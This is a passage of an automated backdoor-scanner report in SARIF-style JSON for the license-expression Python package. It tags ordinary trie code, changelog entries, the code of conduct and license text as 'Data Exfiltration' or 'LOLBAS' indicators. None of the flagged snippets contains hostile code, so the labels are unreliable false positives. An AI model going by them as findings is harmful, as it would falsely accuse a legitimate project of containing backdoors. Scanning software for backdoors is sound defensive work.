                      "markdown": "`                state = state.fail\n\n            # we have a matching starting token_string\n            state = state.children.get(token_string, self.root)\n            match = state\n            while match is not nil:\n                if match.output is not nil:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/src/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 250,
                  "startColumn": 42,
                  "endLine": 250,
                  "endColumn": 47,
                  "snippet": {
                    "text": "                state = current_node.fail\n                while node.token not in state.children:\n                    state = state.fail\n                node.fail = state.children.get(node.token, self.root)\n\n        # Mark the trie as converted so it cannot be modified anymore\n        self._converted = True\n",
                    "rendered": {
                      "text": "                state = current_node.fail\n                while node.token not in state.children:\n                    state = state.fail\n                node.fail = state.children.get(node.token, self.root)\n\n        # Mark the trie as converted so it cannot be modified anymore\n        self._converted = True\n",
                      "markdown": "`                state = current_node.fail\n                while node.token not in state.children:\n                    state = state.fail\n                node.fail = state.children.get(node.token, self.root)\n\n        # Mark the trie as converted so it cannot be modified anymore\n        self._converted = True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 101,
                  "startColumn": 1,
                  "endLine": 101,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nChanged\n~~~~~~~\n- Update the thirdparty directory structure.\n\n\nv1.0 - 2019-10-16\n",
                    "rendered": {
                      "text": "\nChanged\n~~~~~~~\n- Update the thirdparty directory structure.\n\n\nv1.0 - 2019-10-16\n",
                      "markdown": "`\nChanged\n~~~~~~~\n- Update the thirdparty directory structure.\n\n\nv1.0 - 2019-10-16\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 1,
                  "endLine": 45,
                  "endColumn": 9,
                  "snippet": {
                    "text": "This is a minor release without API changes\n\n- Use latest skeleton (and updated configure script)\n- Update license list to latest ScanCode and SPDX 3.19\n- Use correct syntax for python_require\n- Drop using Travis and Appveyor\n- Drop support for Python 3.7 and add Python 3.11 in CI\n",
                    "rendered": {
                      "text": "This is a minor release without API changes\n\n- Use latest skeleton (and updated configure script)\n- Update license list to latest ScanCode and SPDX 3.19\n- Use correct syntax for python_require\n- Drop using Travis and Appveyor\n- Drop support for Python 3.7 and add Python 3.11 in CI\n",
                      "markdown": "`This is a minor release without API changes\n\n- Use latest skeleton (and updated configure script)\n- Update license list to latest ScanCode and SPDX 3.19\n- Use correct syntax for python_require\n- Drop using Travis and Appveyor\n- Drop support for Python 3.7 and add Python 3.11 in CI\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 36,
                  "startColumn": 1,
                  "endLine": 36,
                  "endColumn": 9,
                  "snippet": {
                    "text": "This is a minor dot release without API changes\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.20\n\n\nv30.1.0 - 2023-01-16\n",
                    "rendered": {
                      "text": "This is a minor dot release without API changes\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.20\n\n\nv30.1.0 - 2023-01-16\n",
                      "markdown": "`This is a minor dot release without API changes\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.20\n\n\nv30.1.0 - 2023-01-16\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 1,
                  "endLine": 26,
                  "endColumn": 9,
                  "snippet": {
                    "text": "This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.22\n- Add Python 3.12 support in CI\n\n\n",
                    "rendered": {
                      "text": "This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.22\n- Add Python 3.12 support in CI\n\n\n",
                      "markdown": "`This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.22\n- Add Python 3.12 support in CI\n\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 1,
                  "endLine": 17,
                  "endColumn": 9,
                  "snippet": {
                    "text": "This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.23\n- Drop support for Python 3.7\n\nv30.2.0 - 2023-11-29\n",
                    "rendered": {
                      "text": "This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.23\n- Drop support for Python 3.7\n\nv30.2.0 - 2023-11-29\n",
                      "markdown": "`This is a minor release without API changes:\n\n- Use latest skeleton\n- Update license list to latest ScanCode and SPDX 3.23\n- Drop support for Python 3.7\n\nv30.2.0 - 2023-11-29\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 1,
                  "endLine": 9,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nThis is a minor release without API changes:\n\n- Update link references of ownership from nexB to aboutcode-org\n\nv30.3.0 - 2024-03-18\n--------------------\n",
                    "rendered": {
                      "text": "\nThis is a minor release without API changes:\n\n- Update link references of ownership from nexB to aboutcode-org\n\nv30.3.0 - 2024-03-18\n--------------------\n",
                      "markdown": "`\nThis is a minor release without API changes:\n\n- Update link references of ownership from nexB to aboutcode-org\n\nv30.3.0 - 2024-03-18\n--------------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/CHANGELOG.rst"
                },
                "region": {
                  "startLine": 86,
                  "startColumn": 23,
                  "endLine": 87,
                  "snippet": {
                    "text": "~~~~~~~\n- Drop support for Python 2.\n- Adopt the project skeleton from https://github.com/nexB/skeleton\n  and its new configure script\n\n\nv1.2 - 2019-11-14\n------------------\n",
                    "rendered": {
                      "text": "~~~~~~~\n- Drop support for Python 2.\n- Adopt the project skeleton from https://github.com/nexB/skeleton\n  and its new configure script\n\n\nv1.2 - 2019-11-14\n------------------\n",
                      "markdown": "`~~~~~~~\n- Drop support for Python 2.\n- Adopt the project skeleton from https://github.com/nexB/skeleton\n  and its new configure script\n\n\nv1.2 - 2019-11-14\n------------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/CODE_OF_CONDUCT.rst"
                },
                "region": {
                  "startLine": 83,
                  "startColumn": 22,
                  "endLine": 84,
                  "snippet": {
                    "text": "-----------\n\nThis Code of Conduct is adapted from the `Contributor Covenant`_ ,\nversion 1.4, available at\nhttps://www.contributor-covenant.org/version/1/4/code-of-conduct.html\n\n.. _Contributor Covenant: https://www.contributor-covenant.org\n",
                    "rendered": {
                      "text": "-----------\n\nThis Code of Conduct is adapted from the `Contributor Covenant`_ ,\nversion 1.4, available at\nhttps://www.contributor-covenant.org/version/1/4/code-of-conduct.html\n\n.. _Contributor Covenant: https://www.contributor-covenant.org\n",
                      "markdown": "`-----------\n\nThis Code of Conduct is adapted from the `Contributor Covenant`_ ,\nversion 1.4, available at\nhttps://www.contributor-covenant.org/version/1/4/code-of-conduct.html\n\n.. _Contributor Covenant: https://www.contributor-covenant.org\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/CODE_OF_CONDUCT.rst"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 29,
                  "endLine": 68,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\nThe project team is obligated to maintain confidentiality with regard to\n",
                    "rendered": {
                      "text": "\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\nThe project team is obligated to maintain confidentiality with regard to\n",
                      "markdown": "`\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\nThe project team is obligated to maintain confidentiality with regard to\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/CODE_OF_CONDUCT.rst"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 42,
                  "endLine": 67,
                  "endColumn": 46,
                  "snippet": {
                    "text": "-----------\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\n",
                    "rendered": {
                      "text": "-----------\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\n",
                      "markdown": "`-----------\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/CODE_OF_CONDUCT.rst"
                },
                "region": {
                  "startLine": 59,
                  "startColumn": 49,
                  "endLine": 59,
                  "endColumn": 53,
                  "snippet": {
                    "text": "spaces when an individual is representing the project or its community.\nExamples of representing a project or community include using an\nofficial project e-mail address, posting via an official social media\naccount, or acting as an appointed representative at an online or\noffline event. Representation of a project may be further defined and\nclarified by project maintainers.\n\n",
                    "rendered": {
                      "text": "spaces when an individual is representing the project or its community.\nExamples of representing a project or community include using an\nofficial project e-mail address, posting via an official social media\naccount, or acting as an appointed representative at an online or\noffline event. Representation of a project may be further defined and\nclarified by project maintainers.\n\n",
                      "markdown": "`spaces when an individual is representing the project or its community.\nExamples of representing a project or community include using an\nofficial project e-mail address, posting via an official social media\naccount, or acting as an appointed representative at an online or\noffline event. Representation of a project may be further defined and\nclarified by project maintainers.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/apache-2.0.LICENSE"
                },
                "region": {
                  "startLine": 193,
                  "startColumn": 39,
                  "endLine": 194,
                  "snippet": {
                    "text": "\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/apache-2.0.LICENSE"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 57,
                  "endLine": 110,
                  "endColumn": 61,
                  "snippet": {
                    "text": "          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n",
                    "rendered": {
                      "text": "          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n",
                      "markdown": "`          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/apache-2.0.LICENSE"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 60,
                  "endLine": 56,
                  "endColumn": 69,
                  "snippet": {
                    "text": "      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n",
                    "rendered": {
                      "text": "      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n",
                      "markdown": "`      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/apache-2.0.LICENSE"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 5,
                  "endLine": 17,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n",
                    "rendered": {
                      "text": "\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n",
                      "markdown": "`\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/apache-2.0.LICENSE"
                },
                "region": {
                  "startLine": 139,
                  "startColumn": 24,
                  "endLine": 139,
                  "endColumn": 33,
                  "snippet": {
                    "text": "      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n",
                    "rendered": {
                      "text": "      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n",
                      "markdown": "`      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/gen_pypi_simple.py.ABOUT"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 28,
                  "endLine": 8,
                  "endColumn": 33,
                  "snippet": {
                    "text": "   Copyright (c) 2010 David Wolever <david@wolever.net>\n   Copyright (c) The pip developers\nnotes: Originally from https://github.com/wolever/pip2pi and modified extensivley\n Also partially derived from pip code\n",
                    "rendered": {
                      "text": "   Copyright (c) 2010 David Wolever <david@wolever.net>\n   Copyright (c) The pip developers\nnotes: Originally from https://github.com/wolever/pip2pi and modified extensivley\n Also partially derived from pip code\n",
                      "markdown": "`   Copyright (c) 2010 David Wolever <david@wolever.net>\n   Copyright (c) The pip developers\nnotes: Originally from https://github.com/wolever/pip2pi and modified extensivley\n Also partially derived from pip code\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/gen_pypi_simple.py.ABOUT"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 20,
                  "endLine": 6,
                  "endColumn": 25,
                  "snippet": {
                    "text": "license_expression: bsd-2-clause-views and mit\ncopyright: Copyright (c) nexB Inc.\n   Copyright (c) 2010 David Wolever <david@wolever.net>\n   Copyright (c) The pip developers\nnotes: Originally from https://github.com/wolever/pip2pi and modified extensivley\n Also partially derived from pip code\n",
                    "rendered": {
                      "text": "license_expression: bsd-2-clause-views and mit\ncopyright: Copyright (c) nexB Inc.\n   Copyright (c) 2010 David Wolever <david@wolever.net>\n   Copyright (c) The pip developers\nnotes: Originally from https://github.com/wolever/pip2pi and modified extensivley\n Also partially derived from pip code\n",
                      "markdown": "`license_expression: bsd-2-clause-views and mit\ncopyright: Copyright (c) nexB Inc.\n   Copyright (c) 2010 David Wolever <david@wolever.net>\n   Copyright (c) The pip developers\nnotes: Originally from https://github.com/wolever/pip2pi and modified extensivley\n Also partially derived from pip code\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_pip_compatibility_tags.py.ABOUT"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 25,
                  "endLine": 14,
                  "endColumn": 30,
                  "snippet": {
                    "text": "download_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/utils/compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling",
                    "rendered": {
                      "text": "download_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/utils/compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling",
                      "markdown": "`download_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/utils/compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_pip_compatibility_tags.py.ABOUT"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 38,
                  "endLine": 12,
                  "endColumn": 43,
                  "snippet": {
                    "text": "package_url: pkg:github/pypa/pip@20.3.1#src/pip/_internal/utils/compatibility_tags.py\n\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/utils/compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling",
                    "rendered": {
                      "text": "package_url: pkg:github/pypa/pip@20.3.1#src/pip/_internal/utils/compatibility_tags.py\n\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/utils/compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling",
                      "markdown": "`package_url: pkg:github/pypa/pip@20.3.1#src/pip/_internal/utils/compatibility_tags.py\n\ndownload_url: https://github.com/pypa/pip/blob/20.3.1/src/pip/_internal/utils/compatibility_tags.py\ncopyright: Copyright (c) 2008-2020 The pip developers (see AUTHORS.txt file)\nlicense_expression: mit\nnotes: subset copied from pip for tag handling`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_pip_compatibility_tags.py.ABOUT"
                },
                "region": {
                  "startLine": 5,
                  "startColumn": 5,
                  "endLine": 6,
                  "snippet": {
                    "text": "\ntype: github\nnamespace: pypa\nname: pip\nversion: 20.3.1\nsubpath: src/pip/_internal/utils/compatibility_tags.py\n\npackage_url: pkg:github/pypa/pip@20.3.1#src/pip/_internal/utils/compatibility_tags.py\n",
                    "rendered": {
                      "text": "\ntype: github\nnamespace: pypa\nname: pip\nversion: 20.3.1\nsubpath: src/pip/_internal/utils/compatibility_tags.py\n\npackage_url: pkg:github/pypa/pip@20.3.1#src/pip/_internal/utils/compatibility_tags.py\n",
                      "markdown": "`\ntype: github\nnamespace: pypa\nname: pip\nversion: 20.3.1\nsubpath: src/pip/_internal/utils/compatibility_tags.py\n\npackage_url: pkg:github/pypa/pip@20.3.1#src/pip/_internal/utils/compatibility_tags.py\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_requirements.py"
                },
                "region": {
                  "startLine": 118,
                  "startColumn": 17,
                  "endLine": 119,
                  "snippet": {
